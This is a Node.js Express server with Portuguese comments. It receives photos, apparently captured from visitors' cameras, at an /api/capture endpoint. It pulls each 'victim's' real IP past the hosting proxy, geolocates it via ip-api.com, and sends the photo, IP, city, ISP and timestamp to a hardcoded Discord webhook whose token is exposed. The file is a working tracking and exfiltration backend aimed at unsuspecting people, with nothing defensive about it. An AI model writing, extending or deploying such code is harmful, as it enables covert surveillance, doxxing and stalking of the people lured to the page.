// language: JavaScript, file: server.js
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// COLOQUE A URL DO TEU WEBHOOK DO DISCORD AQUI EMBAIXO
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561449233327071364/HqD_RUllJp7ni_jIn7ZYhydELMiJa_Bp5VtX3NFhuBG60SvcBOyOFftwTZUdv-DpeIu_";

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/capture', async (req, res) => {
    // 1. Tenta pegar o IP real da vítima (furando o proxy do Render)
    const xff = req.headers['x-forwarded-for'];
    let ip = xff ? xff.split(',')[0].trim() : req.socket.remoteAddress;
    
    // Se vier um IP de rede local do Render, tenta o remoteAddress
    if (ip.startsWith('10.') || ip.startsWith('192.') || ip === '::1') {
        ip = req.socket.remoteAddress;
    }

    const photoBase64 = req.body.image;
    const photoBuffer = Buffer.from(photoBase64.replace(/^data:image\/\w+;base64,/, ""), 'base64');

    let geo = { city: 'Desconhecida', region: 'Desconhecida', isp: 'Desconhecido' };
    
    // 2. Busca a localização do IP
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
        if (response.data.status === 'success') {
            geo.city = response.data.city;
            geo.region = response.data.regionName;
            geo.isp = response.data.isp;
        } else {
            console.log("API ip-api falhou:", response.data.message);
        }
    } catch (e) {
        console.log("Erro na API de IP:", e.message);
    }

    const logData = `
**IP:** ${ip}
**Cidade:** ${geo.city} - ${geo.region}
**Provedor:** ${geo.isp}
**Hora:** ${new Date().toLocaleString('pt-BR')}
    `;
    console.log(logData);

    // 3. Manda pro Discord
    if (DISCORD_WEBHOOK_URL.includes("SEU_ID_AQUI") === false) {
        try {
            const form = new FormData();
            form.append('payload_json', JSON.stringify({ content: logData }));
            form.append('file1', photoBuffer, 'foto.jpg');

            await axios.post(DISCORD_WEBHOOK_URL, form, {
                headers: form.getHeaders()
            });
            console.log("Enviado pro Discord com sucesso.");
        } catch (e) {
            console.log("Erro ao mandar pro Discord:", e.message);
        }
    }

    res.json({ status: 'ok' });
});

app.listen(3000, () => {
    console.log('Servidor rodando na porta 3000');
});
